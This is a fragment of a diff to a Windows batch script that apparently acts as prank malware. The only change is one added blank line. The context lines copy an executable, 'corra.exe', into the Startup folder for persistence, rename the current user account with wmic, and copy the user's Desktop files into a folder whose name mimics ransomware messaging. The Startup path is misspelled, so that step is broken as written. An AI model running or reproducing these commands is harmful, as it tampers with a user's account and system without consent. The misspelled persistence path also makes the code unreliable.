@@ -4,6 +4,7 @@ copy %temp%\corra.exe "C:\ProgamData\Microsoft\Windows\Start Menu\Progams\Startu
 wmic useraccount where name='%username%' set FullName='i like u'
 wmic useraccount where name='%username%' rename'i like u'
 SET /a cr=0
+
 mkdir "%userprofile%\Documents\Your Files has been saved"
 copy "%userprofile%\Desktop\*" "%userprofile%\Documents\Your Files has been saved"
 
